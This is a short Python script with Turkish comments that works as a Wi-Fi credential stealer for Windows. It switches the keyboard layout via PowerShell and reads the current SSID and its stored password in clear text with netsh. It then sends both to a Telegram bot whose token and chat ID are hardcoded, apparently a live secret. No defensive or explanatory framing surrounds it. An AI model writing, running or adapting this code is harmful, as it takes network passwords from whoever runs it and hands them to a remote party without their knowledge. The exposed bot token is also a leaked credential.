from re import U
import subprocess
import requests


# --- TELEGRAM AYARLARI ---
BOT_TOKEN = "8557844893:AAGkayWSmLJMaCzFxFhDDQLhlGqUTCuruww"
CHAT_ID   = "1791230559"


def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": text
    }
    try:
        requests.post(url, data=data)
    except Exception as e:
        print("Telegram gönderimde hata:", e)



def set_keyboard(layout):
    cmd = f'Set-WinUserLanguageList {layout} -Force'
    subprocess.run(["powershell", cmd], shell=True)


def get_current_ssid():
    result = subprocess.run(
        ["netsh", "wlan", "show", "interfaces"],
        capture_output=True,
        text=True
    )
    output = result.stdout
    for line in output.splitlines():
        line = line.strip()
        if line.startswith("SSID") and "BSSID" not in line:
            return line.split(":", 1)[1].strip()
    return None


def get_wifi_password(ssid):
    result = subprocess.run(
        ["netsh", "wlan", "show", "profile", f'name={ssid}', "key=clear"],
        capture_output=True,
        text=True
    )
    output = result.stdout
    for line in output.splitlines():
        line = line.strip()
        if line.startswith("Key Content"):
            return line.split(":", 1)[1].strip()
    return None



# --- ANA AKIŞ ---
set_keyboard("en-US")

ssid = get_current_ssid()
password = None

if ssid:
    password = get_wifi_password(ssid)

set_keyboard("tr-TR")


# --- TELEGRAM'A MESAJ GÖNDER ---
if ssid:
    if password:
        message = f"Bağlı olduğun Wi-Fi: {ssid}\nŞifre: {password}"
    else:
        message = f"Bağlı olduğun Wi-Fi: {ssid}\nŞifre bulunamadı."
else:
    message = "Herhangi bir Wi-Fi ağına bağlı değilsin."

send_telegram_message(message)

print("Telegram'a gönderildi!")
